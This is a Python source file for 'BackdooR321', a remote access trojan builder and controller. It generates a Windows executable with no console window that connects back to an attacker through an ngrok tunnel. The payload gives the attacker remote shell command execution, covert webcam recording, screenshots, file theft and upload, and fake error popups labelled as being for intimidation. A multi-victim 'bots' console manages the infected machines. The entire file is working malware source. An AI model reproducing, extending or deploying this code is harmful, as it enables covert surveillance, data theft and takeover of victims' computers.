import socket
import os
import sys
import time
import shutil
import base64
import threading

def create_backdoor(ip,port):
    ngrok_ip_addr = (base64.b64encode((input('[*]Input the Ngrok IP Address or Your IP: ')).encode('utf-8'))).decode('utf-8')
    ngrok_port_addr = input('[*]Input the Ngrok PORT Address or Just Port Number: ')
    icon_file_name = input('[*]Icon File [Default : None] : ')


    default_code = r'''
import socket
import os
import sys
import time
import subprocess
import shutil
import cv2
import base64
import win32api

from PIL import ImageGrab
from pynput import keyboard
from threading import *

while True:
    try:
        client_sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        client_sock.connect(((base64.b64decode('%s'.encode('utf-8'))).decode('utf-8'),%s))

        print("Connected!")
        host_name = socket.gethostname()
       
        client_sock.send(host_name.encode('utf-8'))

        def webcam_c_recv(client_sock):
            while True:
                break_data = client_sock.recv(1024).decode('utf-8')
                if(break_data == 'cancle'):
                    global webcam_c_break
                    webcam_c_break = 'true'
                    break

            
            
        def file_send(file_name,client_sock):
            file_rb = open(file_name,'rb')

            while True:
                file_rb_data = file_rb.read(3072)
                client_sock.send(file_rb_data)
                if not file_rb_data:
                    break
            file_rb.close()
            time.sleep(2)
            client_sock.send('end'.encode('utf-8'))
            
        def file_recv(file_name,client_sock):
            file_wb = open(file_name,'wb')

            while True:
                file_wb_data = client_sock.recv(3072)
                try:
                    if(file_wb_data.decode('utf-8') == 'end'):
                        break
                except:
                    file_wb.write(file_wb_data)
            file_wb.close()
        time.sleep(5)
        while True:
            client_sock.send(os.getcwd().encode('utf-8'))
            recv_cmd = client_sock.recv(3072).decode('utf-8')

            if('cd' in recv_cmd):
                os.chdir(recv_cmd.replace("cd ",""))
            if(recv_cmd == 'ls'):
                client_sock.send((str(os.listdir("."))).encode("utf-8"))
            if('mkdir' in recv_cmd):
                file_name = recv_cmd.replace('mkdir ','')
                os.mkdir(file_name)
            if('webcam' in recv_cmd):
                recv_t = Thread(target=webcam_c_recv,args=(client_sock,))
                recv_t.start()
                
                cap = cv2.VideoCapture(0)
                cap.set(3, 720)
                cap.set(4, 1080)
                if('webcam -c' in recv_cmd):
                    fourcc = cv2.VideoWriter_fourcc(*"XVID")
                    out = cv2.VideoWriter('cap.mp4',fourcc,20.0,(640,480))

                while True:
                    ret, frame = cap.read()
                    if('webcam -c' in recv_cmd):
                        out.write(frame)
                        cap_name = 'cap.mp4'
                    elif('webcam -p' in recv_cmd):
                        cv2.imwrite('cap.jpg',frame)
                        cap_name = 'cap.jpg'
                    if('-h' in recv_cmd):
                        pass
                    else:
                        cv2.imshow('Welcome To BackdooR321!!!',frame)
                    cv2.waitKey(1)
                    try:
                        if(webcam_c_break == 'true'):
                            webcam_c_break = ''
                            break
                    except:
                        pass
                cap.release()
                if('webcam -c' in recv_cmd):
                    out.release()
                cv2.destroyAllWindows()
                file_send(cap_name,client_sock)
                os.system(f"del {cap_name}")
                
            if('@' in recv_cmd):
                os.system("{}".format(recv_cmd.replace('@','')))
            if('$' in recv_cmd):
                popen_data = subprocess.check_output(recv_cmd.replace('$',''),stdin=subprocess.PIPE,stderr = subprocess.PIPE, shell = True).decode('cp949')
                client_sock.send(popen_data.encode('utf-8'))
            if('screenshot' in recv_cmd):
                os.system("mkdir C:\\error")
                
                file_name = "screenshot.jpg"
                img = ImageGrab.grab()
                img.save(file_name)

                file_rb = open("screenshot.jpg",'rb')
                while True:
                    file_rb_data = file_rb.read(3072)
                    client_sock.send(file_rb_data)
                    if not file_rb_data:
                        break
                file_rb.close()
                time.sleep(2)
                client_sock.send('end'.encode('utf-8'))
                os.system("del screenshot.jpg")
            if('exit' == recv_cmd):
                a = {}
                print(a[1234])
            if('beep' in recv_cmd):
                sound_option = recv_cmd.split(' ')
                sound_info = int(sound_option[1])
                sound_vol = int(sound_option[2])*1000

                win32api.Beep(sound_info,sound_vol)
            if('txt -r' in recv_cmd):
                file_name = recv_cmd.replace('txt -r ','')
                file_r = open(file_name,'r')
                file_r_data = file_r.read()
                client_sock.send(file_r_data.encode('utf-8'))
            if('txt -w' in recv_cmd):
                file_name = recv_cmd.replace('txt -w ','')
                data = client_sock.recv(10000).decode('utf-8')
                file_w = open(file_name,'w')
                file_w.write(data.replace('^','\n'))
                file_w.close()
            if('download' in recv_cmd):
                
                file_name = recv_cmd.replace('download ','')
                file_send(file_name,client_sock)
            if('upload' in recv_cmd):
                file_name = recv_cmd.replace('upload ','')
                file_wb = open(file_name,'wb')

                while True:
                    file_wb_data = client_sock.recv(3072)
                    try:
                        if(file_wb_data.decode('utf-8') == 'end'):
                            break
                    except:
                        file_wb.write(file_wb_data)
                file_wb.close()
            if('msg' == recv_cmd):
                msg_cont = client_sock.recv(2024).decode('utf-8')
                msg_title = client_sock.recv(2024).decode('utf-8')

                os.system('mkdir C:\\error')
                os.system(f"echo x=msgbox(\"{msg_cont}\",0+16,\"{msg_title}\") > C:\\error\\error.vbs")
                os.system('start C:\\error\\error.vbs')
            if('dummy' == recv_cmd):
                pass
    except Exception as error:
        pass
'''% (ngrok_ip_addr,ngrok_port_addr)
    file_name = input('[*]Input File Name : ')
    file_w = open(f'{file_name}.py','w')

    file_w.write(default_code)
    file_w.close()
    if(icon_file_name == '' or ' ' in icon_file_name):
        os.system(f"pyinstaller --onefile --noconsole --noupx --hidden-import pillow --hidden-import opencv-python --hidden-import base64 --hidden-import pypiwin32 {file_name}.py")
    else:
        os.system(f"pyinstaller --onefile --noconsole --noupx --icon=Icons\\{icon_file_name} --hidden-import pillow --hidden-import opencv-python --hidden-import base64 --hidden-import pypiwin32 {file_name}.py")
    os.system(f"move dist\\{file_name}.exe Backdoors\\{file_name}.exe")
    #os.system("pause")
    shutil.rmtree("__pycache__")#os.system("rmdir __pycache__")
    shutil.rmtree('build')#os.system("rmdir build")
    shutil.rmtree('dist')#os.system("rmdir dist")
    os.system(f"del {file_name}.spec")
    os.system(f"del {file_name}.py")
    print('\n[*]Done.')
    input()

def file_recv(file_name,client_sock):
    try:
        file_wb = open(f"Downloaded\\{file_name}",'wb')
        print(f'Downloading File... [Target : {file_name}]')
        while True:
            file_wb_data = client_sock.recv(3072)
            try:
                if(file_wb_data.decode('utf-8') == 'end'):
                    break
            except:
                file_wb.write(file_wb_data)
        file_wb.close()
        print('\n### Downloaded Successfull ###')
        print(f'#File Name : {file_name}')
        print('### Downloaded Successfull ###')
    except KeyboardInterrupt:
        file_wb.close()
        print('\n### Downloading Cancled ###')
        print(f'#File Name : {file_name}')
        print('\n### Downloading Cancled ###')

def command(client_sock):
    while True:
        path = client_sock.recv(2024).decode('utf-8')
        print(f"{path}>> ",end='')
        cmd = input()

        if('cd' in cmd):
            client_sock.send(cmd.encode('utf-8'))
        elif('ls' in cmd):
            client_sock.send(cmd.encode('utf-8'))
            print(client_sock.recv(8000).decode("utf-8"))
        elif('mkdir' in cmd):
            client_sock.send(cmd.encode("utf-8"))
        elif('@' in cmd):
            client_sock.send(cmd.encode('utf-8'))
        elif('set' == cmd):
            client_sock.send('dummy'.encode('utf-8'))
            set_msg = '''
[*]Color Setting : 
    [1] White
    [2] Blue
    [3] Red
    [4] Greenqkwpodk
            '''
            print(set_msg)
        elif('set color' in cmd):
            client_sock.send('dummy'.encode('utf-8'))
            color_opt = cmd.replace('set color ','')
            color_dic = {'1' : '0f','2' : '0b','3' : '4','4' : '0a'}
            try:
                os.system(f'color {color_dic[color_opt]}')
            except:
                pass
        elif('$' in cmd):
            client_sock.send(cmd.encode('utf-8'))
            popen_data = client_sock.recv(8000).decode('utf-8')
            print(popen_data)
            '''
        elif('keylog' == cmd):
            client_sock.send(cmd.encode('utf-8'))
            w_data = ''
            while True:
                try:
                    keylog_data = client_sock.recv(1024).decode('utf-8')
                    client_sock.send('d'.encode('utf-8'))
                    print(keylog_data,end='\r')
                except KeyboardInterrupt:
                    client_sock.send('end'.encode('utf-8'))'''
        elif('webcam' in cmd):
            client_sock.send(cmd.encode('utf-8'))
            
            print("[*]Recording Target's Webcam...[Enter : Cancle]")
            input()
            client_sock.send('cancle'.encode('utf-8'))
            now = time.localtime()
            if('-p' in cmd):
                file_exten = '.jpg'
            elif('-c' in cmd):
                file_exten = '.mp4'
            file_name = f"Webcam-{now.tm_year}-{now.tm_mon}-{now.tm_mday}-{now.tm_hour}-{now.tm_min}-{now.tm_sec}{file_exten}"
            file_recv(file_name,client_sock)
        elif("screenshot" in cmd):
            client_sock.send(cmd.encode('utf-8'))
            now = time.localtime()
            file_name = f"{now.tm_year}-{now.tm_mon}-{now.tm_mday}-{now.tm_hour}-{now.tm_min}-{now.tm_sec}.png"
            file_wb = open(f"Screenshots\\{file_name}",'wb')
            print('[*]Saving Screenshot File...')

            while True:
                file_wb_data = client_sock.recv(3072)
                try:
                    if(file_wb_data.decode('utf-8') == 'end'):
                        break
                except:
                    file_wb.write(file_wb_data)
            file_wb.close()
            print('[*]Saved Screenshot!')
            print(f'[*]File Name : Screenshots\\{file_name}')
            
        elif('exit' == cmd):
            client_sock.send(cmd.encode("utf-8"))
            quit()
        elif('txt -r' in cmd):
            client_sock.send(cmd.encode('utf-8'))
            data = client_sock.recv(100000).decode('utf-8')
            print(data)

        elif('help' == cmd):
            help_msg = '''
[*]Simple Command List:
    1. cd [Folder] - 파일이동
    2. ls - 파일 리스트
    3. mkdir - 폴더 제작
    4. @[cmd_command] - 일부 cmd 명령어 실행 
    5. $[cmd_command] - cmd 명령어 실행후 출력값 출력
    6. screenshot - 스크린샷
    7. txt -r [file_name] - 텍스트 파일 읽기
    8. txt -w [file_name] - 텍스트 파일 쓰기 및 수정
    9. download [file_name] - 파일 다운로드
    10. upload [file_name] - 파일 업로드
    11. msg - 오류창 출력 (위협용)
    12. cls or clear - 화면 초기화
    13. help - 명령어 리스트 출력
    14. beep [hz] [time len] - 소리 출력
    15. exit - 종료
    
[*]Webcam Hacking Command List:
    1. webcam -c - 웹캠 영상 캡처
    2. webcam -c -h - 위협 없이 영상 캡처
    3. webcam -p - 웹캠 사진 캡처.
    4. webcam -p -h - 위협없이 사진

[*] Setting Command List:
    1. set - 세팅 화면
    2. set color [option] - 색깔 설정
            '''
            client_sock.send('dummy'.encode('utf-8'))
            print(help_msg)
        elif('txt -w' in cmd):
            client_sock.send(cmd.encode('utf-8'))
            print('> ',end='')
            data = input()
            client_sock.send(data.encode('utf-8'))
        elif('download' in cmd):
            client_sock.send(cmd.encode('utf-8'))
            file_name = cmd.replace('download ','')
            #result = client_sock.recv(2024).decode('utf-8')
            
            file_wb = open(f"Downloaded\\{file_name}",'wb')
            print(f'Downloading File... [Target : {file_name}]')
            while True:
                file_wb_data = client_sock.recv(3072)
                try:
                    if(file_wb_data.decode('utf-8') == 'end'):
                        break
                except:
                    file_wb.write(file_wb_data)
            file_wb.close()
            print('\n### Downloaded Successfull ###')
            print(f'#File Name : {file_name}')
            print('### Downloaded Successfull ###')
        elif('upload' in cmd):
            client_sock.send(cmd.encode('utf-8'))
            file_name = cmd.replace('upload ','')
            file_rb = open(f"Upload\\{file_name}",'rb')
            print(f'Uploading File... [Target : {file_name}]')

            while True:
                file_rb_data = file_rb.read(3072)
                client_sock.send(file_rb_data)

                if not file_rb_data:
                    break
            print('\n### Uploaded Successfull ###')
            print(f"#File Name : {file_name}")
            print('### Uploaded Successfull ###')
            file_rb.close()
            time.sleep(2)
            client_sock.send('end'.encode('utf-8'))
        elif('msg' in cmd):
            client_sock.send(cmd.encode('utf-8'))
            msg_cont = input("Content> ")
            client_sock.send(msg_cont.encode('utf-8'))
            msg_title = input('Title> ')
            client_sock.send(msg_title.encode('utf-8'))
        elif('beep' in cmd):
            client_sock.send(cmd.encode('utf-8'))

        elif('cls' == cmd or 'clear' == cmd):
            client_sock.send('dummy'.encode('utf-8'))
            os.system("cls")
        elif('' == cmd):
            client_sock.send('dummy'.encode('utf-8'))
        else:
            client_sock.send('dummy'.encode('utf-8'))
            print(f"[!]Command '{cmd}' not found.")

def select_menu(client_list,sel_menu):
    while True:
        print("")
        print("[*]Online Bots : ")
        print("-------------------------------------------------------------")
        for i in range(1,99999):
            try:
                print(f"[{i}] {sel_menu[i]}")
            except KeyError:
                break
        print("-------------------------------------------------------------")
        sel = input("SELECT>> ")
        if(sel == 'exit'):
            sys.exit()
        else:
            try:
                client_sock = client_list[sel_menu[int(sel)]]
                command(client_sock)
            except:
                pass



def accept_clients(server_sock):
    i = 1
    j = 1
    while True:
        global client_list
        global sel_menu

        client_sock, ip_addr = server_sock.accept()
        host_name = client_sock.recv(1024).decode('utf-8')
        if(ip_addr[0] == '127.0.0.1'):
            addr = f"ngrok user {j}"
            j += 1
        else:
            addr = ip_addr[0]
        bot_name = f"HOST_NAME : {host_name} | IP : {addr}"
        client_list[bot_name] = client_sock
        sel_menu[i] = bot_name
        print(f"[*]New Bot Connected! | {bot_name}")    
        i += 1


def main_func(ip,port,ngrok,creation,manyvi):
    server_sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server_sock.bind((ip,port))
    server_sock.listen(1)
    
    if(ngrok):
        os.system(f"start ngrok tcp {port}")
    else:
        pass
    if(creation):
        create_backdoor(ip,port)
    else:
        pass
    
    if(manyvi):
        global sel_menu
        global client_list

        sel_menu = {}
        client_list = {}
        wait_time = int(input("WAITING TIME : "))
        print("Press Enter To start the Recving...")
        input()
        print('\nRecved Clients : ')
        accept_th = threading.Thread(target = accept_clients, args = (server_sock,))
        accept_th.daemon = True
        accept_th.start()
        time.sleep(wait_time)
        print("Press Enter to Continue...")
        input()
        select_menu(client_list,sel_menu)
    else:
        print("Wait for 1 Bot...")
        client_sock, ip_addr = server_sock.accept()
        host_name = client_sock.recv(1024).decode('utf-8')
        if(ip_addr[0] == '127.0.0.1'):
            addr = 'ngrok user'
        else:
            addr = ip_addr[0]
        bot_name = f"HOST NAME : {host_name} | ADDR : {addr}"
        print(f"[*] New Bot Connected! {bot_name}")
        input()
        command(client_sock)    

def get_argv():

    os.system("color 0a")    
    try:
        if('--ip=' in sys.argv[1] and '--port=' in sys.argv[2]):
            ip = sys.argv[1].replace('--ip=','')
            port = int(sys.argv[2].replace('--port=',''))
            if(ip == '127.0.0.1'):
                ip = ''
            else:
                pass
            ngrok = False
            creation = False
        if('--ip=' in sys.argv[1] and '--port=' in sys.argv[2] and '--ngrok' in sys.argv[3]):
            ip = sys.argv[1].replace('--ip=','')
            if(ip == '127.0.0.1'):
                ip = ''
            else:
                pass
            port = int(sys.argv[2].replace('--port=',''))
            ngrok = True
            creation = False
        if('--ip=' in sys.argv[1] and '--port=' in sys.argv[2] and '--create' in sys.argv[3]):
            ip = sys.argv[1].replace('--ip=','')
            if(ip == '127.0.0.1'):
                ip = ''
            else:
                pass
            port = int(sys.argv[2].replace('--port=',''))
            ngrok = False
            creation = True
        if('--ip=' in sys.argv[1] and '--port=' in sys.argv[2] and '--ngrok' in sys.argv[3] and '--create' in sys.argv[4]):
            ip = sys.argv[1].replace('--ip=','')
            if(ip == '127.0.0.1'):
                ip = ''
            else:
                pass
            port = int(sys.argv[2].replace('--port=',''))
            ngrok = True
            creation = True
        for i in range(1,5+1):
            if('--clients' in sys.argv[i]):
                manyvi = True
                break
            else:
                pass
        
        main_func(ip,port,ngrok,creation,manyvi)
    except IndexError:
        backdoor321_title = '''
 ######                     ###     
 ### ###   #####    #####   ###  ## 
 ######       ###  ### ###  ### ##  
 ### ###   ######  ###      #####   
 ### ###  ### ###  ### ###  ### ##  
 ######    ### ##   #####   ###  ## 
     ###                    ######  
     ###   #####    #####   ### ### 
  ######  ### ###  ### ###  ### ### 
 ### ###  ### ###  ### ###  ######  
 ### ###  ### ###  ### ###  ### ### 
  ### ##   #####    #####   ### ### 321
  ***Beta Ver. Made By R321 (Minkeun Song)

        '''
        print(backdoor321_title)
        print('[*]Run it by using default setting :')
        print('-[*]IP : 127.0.0.1')
        print('-[*]Port : 8180')
        print('-[*]Ngrok (True/False) [Default : False] : ',end='')
        _ngrok = input()
        print('-[*]Create New Backdoor? [Default : False] : ',end='')
        _creation = input()
        print('-[*]Recv Many Clients? [Default : False] : ',end='')
        _manyvi = input()

        if(_ngrok == 'true' or _ngrok == 'True'):
            ngrok = True
        else:
            ngrok = False
        if(_creation == 'true' or _creation == 'True'):
            creation = True
        else:
            creation = False
        if(_manyvi == 'True' or _manyvi == 'true'):
            manyvi = True
        else:
            manyvi = False

        main_func('',8180,ngrok,creation,manyvi)
        


def main():
    get_argv()

main()

